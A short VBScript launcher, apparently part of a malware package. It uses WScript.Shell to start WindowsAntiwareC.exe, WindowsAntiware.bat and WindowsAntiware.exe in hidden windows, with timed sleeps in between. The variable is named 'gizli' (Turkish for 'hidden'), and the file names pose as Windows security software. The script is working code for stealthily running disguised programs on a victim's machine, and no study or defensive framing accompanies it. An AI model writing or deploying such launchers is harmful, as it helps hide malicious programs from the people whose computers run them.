set gizli = WScript.CreateObject("WScript.Shell")
gizli.Run("WindowsAntiwareC.exe"), 0, False
Set komutlar = WScript.CreateObject("WScript.Shell")
WScript.Sleep 10000
gizli.Run("WindowsAntiware.bat"), 0, False
WScript.Sleep 1000
gizli.Run("WindowsAntiware.exe"), 0, False
